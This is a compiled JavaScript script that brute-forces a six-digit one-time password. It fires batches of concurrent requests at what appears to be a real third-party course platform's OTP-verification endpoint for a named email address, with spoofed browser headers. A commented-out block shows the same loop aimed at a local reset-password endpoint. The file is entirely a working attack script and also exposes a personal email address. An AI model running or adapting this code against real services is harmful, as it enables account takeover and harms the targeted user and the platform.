"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=nkulhari96%40gmail.com&otp=${otp}&mydeviceid=&mydeviceid2=`,
            headers: {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://harkirat.classx.co.in',
                'priority': 'u=1, i',
                'referer': 'https://harkirat.classx.co.in/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
            }
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (error) {
        }
        // let data = JSON.stringify({
        //     "email":"nkulhari96@gmail.com",
        //     "otp": otp,
        //     "newPassword": "Qwerty@1234"
        // });
        // let config = {
        //     method: 'post',
        //     maxBodyLength: Infinity,
        //     url: 'http://localhost:3000/reset-password',
        //     headers: { 
        //       'Content-Type': 'application/json'
        //     },
        //     data : data
        //   };
        // try {
        //     await axios.request(config);
        //     console.log("done for " + otp)
        // } catch (error) {
        //     //console.log(error)
        // }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 1000000; i += 100) {
            const promises = [];
            console.log(i);
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(promises);
        }
    });
}
main();
